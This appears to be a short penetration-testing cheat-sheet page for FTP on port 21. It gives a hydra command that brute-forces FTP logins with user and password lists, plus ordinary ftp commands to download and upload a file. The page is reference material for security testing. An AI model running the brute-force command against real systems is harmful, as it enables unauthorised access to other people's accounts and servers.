---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# FTP - 21

#### Brute force <a href="#brute-force" id="brute-force"></a>

```
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> ftp://<IP> -u -vV
```

#### Downloading file <a href="#downloading-file" id="downloading-file"></a>

```
ftp <IP>
PASSIVE
BINARY
get <FILE>
```

#### Uploading file <a href="#uploading-file" id="uploading-file"></a>

```
ftp <IP>
PASSIVE
BINARY
put <FILE>
```
